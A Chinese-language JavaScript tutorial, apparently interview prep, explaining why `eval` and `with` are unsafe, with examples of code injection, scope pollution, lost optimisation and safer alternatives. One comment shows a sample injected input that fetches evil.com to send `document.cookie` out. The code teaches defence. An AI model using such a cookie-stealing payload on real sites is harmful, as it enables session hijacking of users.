# ✅eval和with为什么被认为是不安全的？

# 典型回答

`eval` 和 `with` 被认为是JavaScript中**不安全**和**不推荐使用**的特性，主要原因是它们破坏作用域规则、导致性能问题和引入安全风险。

## eval 的问题

`eval()` 函数可以将传入的字符串作为JavaScript代码执行，主要存在以下问题：

1. **安全风险**：执行任意代码，可能导致XSS攻击和代码注入
2. **性能问题**：无法被引擎优化（编译时无法知道代码内容）
3. **作用域污染**：可以访问和修改局部变量
4. **调试困难**：动态执行的代码难以调试

## with 的问题

`with` 语句扩展一个对象的作用域链，主要问题包括：

1. **性能问题**：引擎无法确定变量来源，优化失效
2. **歧义性**：无法区分变量是对象的属性还是外层作用域的变量
3. **严格模式禁用**：ES5严格模式下直接报错

**共同问题：**
- 代码的可读性和可维护性差
- 难以调试和测试
- 可能引入难以追踪的bug

# 扩展知识

## eval 的安全风险

```javascript
// 1. 代码注入 — 最危险的问题
function processUserInput(input) {
  // 如果用户输入恶意代码...
  eval(input); // 危险！
}

// 用户输入: "); fetch('https://evil.com/steal?cookie=' + document.cookie); //"
// eval会执行恶意代码

// 2. 访问局部变量
function secretFunction() {
  const secretKey = 'abc123';
  eval('console.log(secretKey)'); // 可以访问局部变量！
}

// 3. JSON解析的安全隐患（早期）
// 早期有人用eval解析JSON（极其危险）
const jsonStr = '{"name": "Alice"}';
const data = eval('(' + jsonStr + ')'); // 如果jsonStr包含恶意代码...
// 现在已经用JSON.parse替代

// 4. 全局污染
function evilEval(code) {
  var x = 1;
  eval(code);
  console.log(x); // 可能被修改
}
evilEval('var x = 100;'); // x被修改为100
```

## eval 的性能问题

```javascript
// eval 阻止引擎优化
function normalFunction() {
  const x = 1;
  const y = 2;
  return x + y;
}

function evalFunction(code) {
  const x = 1;
  const y = 2;
  eval(code); // V8无法优化这个函数
  return x + y; // 引擎不知道x和y是否被修改
}

// V8中的"不能优化"意味着：
// 1. 无法进行类型推断
// 2. 无法进行内联缓存
// 3. 无法进行死代码消除
// 4. 整个函数变为"慢路径"执行

// 间接调用eval可以部分缓解
function saferEval(code) {
  const x = 1;
  // 间接eval — 在全局作用域执行
  const globalEval = eval;
  globalEval(code);
  // 不会污染局部作用域
  console.log(x); // 仍然是1
}
```

## with 的歧义性

```javascript
// with 导致代码歧义
function processWith(obj) {
  with (obj) {
    // x 是 obj.x 还是局部变量 x？
    // value 是 obj.value 还是全局变量？
    console.log(x, value);

    // 赋值操作也不明确
    name = 'test'; // 修改了obj.name还是创建了局部变量？
  }
}

// 实际行为
const obj = { x: 10, name: 'original' };
function testWith(obj) {
  var x = 100;
  with (obj) {
    console.log(x); // 10 — 优先使用obj.x（如果obj有x属性）
    x = 200; // 修改了obj.x
    name = 'changed'; // 修改了obj.name
    y = 300; // 如果obj没有y属性，创建全局变量 y！
  }
}

testWith(obj);
console.log(obj.x); // 200
console.log(obj.name); // 'changed'
console.log(window.y); // 300 — 意外的全局变量！
```

## with 的性能问题

```javascript
// with 导致引擎无法优化
function normalLookup(obj) {
  // V8可以优化：属性访问是固定偏移量
  return obj.x + obj.y;
}

function withLookup(obj) {
  with (obj) {
    // V8无法优化：
    // 1. 无法确定x和y是obj的属性还是外部变量
    // 2. 无法使用内联缓存
    // 3. 作用域链动态变化
    return x + y;
  }
}

// 性能测试
const testObj = { x: 1, y: 2 };

console.time('normal');
for (let i = 0; i < 1000000; i++) {
  normalLookup(testObj);
}
console.timeEnd('normal'); // 快

console.time('with');
for (let i = 0; i < 1000000; i++) {
  withLookup(testObj);
}
console.timeEnd('with'); // 慢很多
```

## 严格模式下的限制

```javascript
'use strict';

// eval 在严格模式下有自己的作用域
function strictEval() {
  var x = 1;
  eval('var x = 100; console.log("内部:", x);'); // 内部: 100
  console.log('外部:', x); // 外部: 1 — eval不污染外部
}

// with 在严格模式下直接报错
function strictWith(obj) {
  // with (obj) { // SyntaxError: Strict mode code may not include a with statement
  //   console.log(x);
  // }
}
```

## 安全的替代方案

```javascript
// eval 的替代方案

// 1. JSON解析 — 用JSON.parse替代eval解析JSON
// 差
const data = eval('(' + jsonString + ')');
// 好
const data = JSON.parse(jsonString);

// 2. 动态属性访问 — 用方括号替代eval
function getProperty(obj, propName) {
  // 差
  return eval('obj.' + propName);
  // 好
  return obj[propName];
}

// 3. 动态函数创建 — 用Function替代eval
// Function 总是在全局作用域执行
function createFunction(body) {
  // 差
  return eval('(function() { ' + body + ' })');
  // 好（仍然有安全隐患，但作用域隔离更好）
  return new Function(body);
}

// with 的替代方案

// 1. 解构赋值
function processObj(obj) {
  // 差
  with (obj) {
    return x + y;
  }
  // 好
  const { x, y } = obj;
  return x + y;
}

// 2. 临时变量引用
function processObj2(obj) {
  // 好
  const x = obj.x;
  const y = obj.y;
  return x + y;
}
```

## 什么时候可以（谨慎）使用eval

```javascript
// 1. JSON.parse 的JSONP回调（不推荐）
function jsonpCallback(data) {
  // 在受控环境下
  eval(data); // 数据源必须是可信的
}

// 2. 模板引擎（已过时）
// 早期的模板引擎使用eval实现
// 现代的模板引擎已经不用eval

// 3. 动态代码生成（不推荐）
// 如在Webpack的dev环境下有eval的source map
// 但实际代码不应该使用eval

// 4. 反序列化（已经被JSON.parse取代）
```

## 代码审查清单

```javascript
// 审查代码时需要注意的模式：
// 1. 任何 eval() 调用
// 2. 任何 with 语句
// 3. setTimeout/setInterval 的字符串参数
//    setTimeout('alert("evil")', 100); // 等同于eval！
// 4. new Function()（谨慎使用）
// 5. 动态创建script标签

// 安全的编码原则：
// - 永远不使用 eval
// - 永远不使用 with
// - 使用 JSON.parse 解析JSON
// - 使用 new Function（而不是eval）在需要动态创建函数时
// - 始终开启严格模式
```
